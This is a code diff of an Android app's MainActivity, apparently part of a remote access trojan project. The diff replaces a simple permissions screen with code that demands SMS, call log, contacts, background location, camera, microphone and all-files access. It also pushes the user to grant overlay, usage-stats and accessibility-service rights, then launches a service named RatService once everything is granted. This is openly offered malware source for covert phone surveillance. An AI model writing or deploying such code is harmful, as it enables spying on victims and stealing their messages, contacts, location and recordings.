@@ -1,112 +1,142 @@
 package com.example.kagenezumi
 
 import android.Manifest
+import android.accessibilityservice.AccessibilityServiceInfo
+import android.app.AppOpsManager
+import android.content.Context
+import android.content.Intent
 import android.content.pm.PackageManager
+import android.net.Uri
 import android.os.Bundle
-import android.widget.Toast
+import android.os.Environment
+import android.os.Process
+import android.provider.Settings
+import android.view.accessibility.AccessibilityManager
+import android.widget.Button
+import android.widget.TextView
 import androidx.activity.ComponentActivity
-import androidx.activity.compose.setContent
-import androidx.activity.enableEdgeToEdge
 import androidx.activity.result.contract.ActivityResultContracts
-import androidx.compose.foundation.layout.*
-import androidx.compose.material3.*
-import androidx.compose.runtime.*
-import androidx.compose.ui.Alignment
-import androidx.compose.ui.Modifier
-import androidx.compose.ui.platform.LocalContext
-import androidx.compose.ui.tooling.preview.Preview
-import androidx.compose.ui.unit.dp
-import com.example.kagenezumi.ui.theme.KageNezumiTheme
+import androidx.core.content.ContextCompat
+import android.util.Log
 
 class MainActivity : ComponentActivity() {
+    private lateinit var statusText: TextView
+    private lateinit var requestPermissionsButton: Button
 
-    private val permissionsToRequest = arrayOf(
-        Manifest.permission.CAMERA,
+    private val permissions = arrayOf(
         Manifest.permission.RECORD_AUDIO,
-        Manifest.permission.ACCESS_FINE_LOCATION
+        Manifest.permission.CAMERA,
+        Manifest.permission.ACCESS_FINE_LOCATION,
+        Manifest.permission.ACCESS_COARSE_LOCATION,
+        Manifest.permission.ACCESS_BACKGROUND_LOCATION,
+        Manifest.permission.READ_EXTERNAL_STORAGE,
+        Manifest.permission.WRITE_EXTERNAL_STORAGE,
+        Manifest.permission.READ_SMS,
+        Manifest.permission.SEND_SMS,
+        Manifest.permission.READ_CALL_LOG,
+        Manifest.permission.READ_PHONE_STATE,
+        Manifest.permission.READ_CONTACTS
     )
+
+    private val permissionLauncher = registerForActivityResult(
+        ActivityResultContracts.RequestMultiplePermissions()
+    ) { results ->
+        checkAndUpdateStatus()
+    }
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        enableEdgeToEdge()
+        setContentView(R.layout.activity_main)
 
-        setContent {
-            KageNezumiTheme {
-                PermissionsUI(permissionsToRequest)
-            }
+        statusText = findViewById(R.id.statusText)
+        requestPermissionsButton = findViewById(R.id.requestPermissionsButton)
+
+        requestPermissionsButton.setOnClickListener {
+            requestAllPermissions()
+        }
+
+        checkAndUpdateStatus()
+    }
+
+    private fun checkAndUpdateStatus() {
+        val status = StringBuilder()
+        var allGranted = true
+
+        // Check regular permissions
+        for (permission in permissions) {
+            val isGranted = ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED
+            status.append("${permission.split(".").last()}: ${if (isGranted) "✓" else "✗"}\n")
+            if (!isGranted) allGranted = false
+        }
+
+        // Check special permissions
+        val specialPermissionsStatus = checkSpecialPermissions()
+        status.append("\nSpecial Permissions:\n")
+        specialPermissionsStatus.forEach { (name, granted) ->
+            status.append("$name: ${if (granted) "✓" else "✗"}\n")
+            if (!granted) allGranted = false
+        }
+
+        // Check Accessibility Service
+        val accessibilityEnabled = isAccessibilityServiceEnabled()
+        status.append("\nAccessibility Service: ${if (accessibilityEnabled) "✓" else "✗"}\n")
+        if (!accessibilityEnabled) allGranted = false
+
+        statusText.text = status.toString()
+        
+        if (allGranted) {
+            startRatService()
         }
     }
-}
 
-@Composable
-fun PermissionsUI(permissions: Array<String>) {
-    val context = LocalContext.current
-    val missingPermissions = remember {
-        permissions.filter {
-            context.checkSelfPermission(it) != PackageManager.PERMISSION_GRANTED
-        }.toMutableStateList()
-    }
-
-    var permissionsGranted by remember { mutableStateOf(missingPermissions.isEmpty()) }
-
-    val launcher = rememberLauncherForActivityResult(
-        contract = ActivityResultContracts.RequestMultiplePermissions()
-    ) { result ->
-        val denied = result.filterValues { !it }.keys
-        missingPermissions.clear()
-        missingPermissions.addAll(denied)
-        permissionsGranted = denied.isEmpty()
-        if (!permissionsGranted) {
-            Toast.makeText(
-                context,
-                "Some permissions were denied. Functionality may be limited.",
-                Toast.LENGTH_LONG
-            ).show()
-        }
-    }
-
-    Surface(modifier = Modifier.fillMaxSize()) {
-        Column(
-            modifier = Modifier
-                .padding(24.dp)
-                .fillMaxSize(),
-            verticalArrangement = Arrangement.Center,
-            horizontalAlignment = Alignment.CenterHorizontally
-        ) {
-            if (permissionsGranted) {
-                Text(
-                    "✅ All permissions granted!",
-                    style = MaterialTheme.typography.headlineMedium
-                )
-            } else {
-                Text(
-                    "⚠️ Permissions required",
-                    style = MaterialTheme.typography.headlineMedium
-                )
-                Spacer(modifier = Modifier.height(16.dp))
-                Button(onClick = { launcher.launch(permissions) }) {
-                    Text("Allow All Permissions")
-                }
-                Spacer(modifier = Modifier.height(16.dp))
-                Text(
-                    "Missing:\n${missingPermissions.joinToString("\n")}",
-                    style = MaterialTheme.typography.bodyMedium
-                )
-            }
-        }
-    }
-}
-
-@Preview(showBackground = true)
-@Composable
-fun PermissionsUIPreview() {
-    KageNezumiTheme {
-        PermissionsUI(
-            arrayOf(
-                Manifest.permission.CAMERA,
-                Manifest.permission.RECORD_AUDIO,
-                Manifest.permission.ACCESS_FINE_LOCATION
-            )
+    private fun checkSpecialPermissions(): Map<String, Boolean> {
+        return mapOf(
+            "SYSTEM_ALERT_WINDOW" to Settings.canDrawOverlays(this),
+            "PACKAGE_USAGE_STATS" to checkUsageStatsPermission(),
+            "MANAGE_EXTERNAL_STORAGE" to Environment.isExternalStorageManager()
         )
+    }
+
+    private fun checkUsageStatsPermission(): Boolean {
+        val appOps = getSystemService(Context.APP_OPS_SERVICE) as AppOpsManager
+        val mode = appOps.checkOpNoThrow(
+            AppOpsManager.OPSTR_GET_USAGE_STATS,
+            Process.myUid(),
+            packageName
+        )
+        return mode == AppOpsManager.MODE_ALLOWED
+    }
+
+    private fun isAccessibilityServiceEnabled(): Boolean {
+        val am = getSystemService(Context.ACCESSIBILITY_SERVICE) as AccessibilityManager
+        val enabledServices = am.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK)
+        return enabledServices.any { it.id.contains(packageName) }
+    }
+
+    private fun requestAllPermissions() {
+        // Request regular permissions
+        permissionLauncher.launch(permissions)
+
+        // Request special permissions
+        if (!Settings.canDrawOverlays(this)) {
+            startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName")))
+        }
+
+        if (!checkUsageStatsPermission()) {
+            startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS))
+        }
+
+        if (!Environment.isExternalStorageManager()) {
+            startActivity(Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION))
+        }
+
+        if (!isAccessibilityServiceEnabled()) {
+            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
+        }
+    }
+
+    private fun startRatService() {
+        val serviceIntent = Intent(this, RatService::class.java)
+        startForegroundService(serviceIntent)
     }
 }
